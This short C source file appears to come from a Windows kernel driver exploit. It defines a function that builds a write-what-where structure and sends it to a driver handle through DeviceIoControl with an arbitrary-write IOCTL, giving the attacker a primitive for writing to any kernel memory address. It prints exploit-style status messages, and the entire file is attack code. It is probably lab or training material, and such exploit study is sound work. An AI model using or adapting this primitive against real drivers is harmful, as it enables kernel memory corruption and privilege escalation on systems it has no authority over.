#include "exploit.h"

void arbitrary_write(HANDLE h_driver, long long what, long long where)
{
	WRITE_WHAT_WHERE www;
	char output[1024];
	unsigned long bytes_returned = 0;

	RtlSecureZeroMemory(&www, sizeof(www));
	RtlSecureZeroMemory(&output, sizeof(output));

	www.What = what;
	www.Where = where;

	printf("\n[!] Writing 0x%p to address 0x%p...", (long long*)what, (long long*)where);
	DeviceIoControl(h_driver, IOCTL_ARBITRARY_WRITE, &www, sizeof(www), &output, sizeof(output), &bytes_returned, 0);

	printf("\n[+] Wrote 0x%p to address 0x%p.", (long long*)what, (long long*)where);
}